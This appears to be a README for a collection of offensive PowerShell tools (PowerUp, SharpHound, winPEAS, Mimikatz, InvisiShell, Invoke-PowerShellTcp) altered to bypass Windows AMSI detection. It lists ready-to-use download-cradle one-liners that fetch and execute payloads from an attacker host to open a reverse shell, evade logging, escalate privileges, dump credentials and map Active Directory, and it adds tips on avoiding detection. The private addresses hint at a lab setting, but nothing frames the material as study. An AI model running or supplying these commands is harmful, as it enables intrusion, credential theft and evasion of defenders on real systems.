
<h1 align="center">
<br>
<img src=ihateamsi.jpg height="310" border="2px solid #555">
<br>
i hate AMSI
</h1>
<h4 align="center">
disabling RTM is for noobs
</h4>

## bypasses

- `PowerUp.ps1`
    - Removed service binaries. Hijack it yourself!
    - HTML reports removed.

- `Invoke-PowerShellTcp`
    - No changes.

- `InvisiShell`
    - No changes.

- `SharpHound.ps1`
    - Had to obfuscate a reflection string.

- `winPEAS.bat`
    - Obfuscated color line string variable (wow. terrible signature.)

## download cradles

These only work on PowerShell 3.0. Don't downgrade to 2.0 you will instantly get caught

- Reverse Shell
`iex (iwr http://172.16.100.X/Invoke-PowerShellTcp-OBFS.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.X -Port 443`

- Load `InvisiShell`
```
iwr http://172.16.100.X/InvisiShellProfiler.dll -UseBasicParsing -OutFile InvisiShellProfiler.dll;
iex (iwr http://172.16.100.X/RunWithRegistryNonAdmin.bat -UseBasicParsing);
iex (iwr http://172.16.100.X/RunWithPathAsAdmin.bat -UseBasicParsing);
```

- Privilege Escalation
```
iex (iwr http://172.16.100.X/winPEAS-OBFS.bat -UseBasicParsing);
iex (iwr http://172.16.100.X/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks;
```

- Dump Creds
`iex (iwr http://172.16.100.X/Invoke-Mimikatz-OBFS.ps1 -UseBasicParsing); Invoke-Mimikatz -DumpCreds;`

- Active Directory
```
iex (iwr http://172.16.99.77/SharpHound.ps1); Invoke-BloodHound -CollectionMethod All -Stealth -ExcludeDCs;
```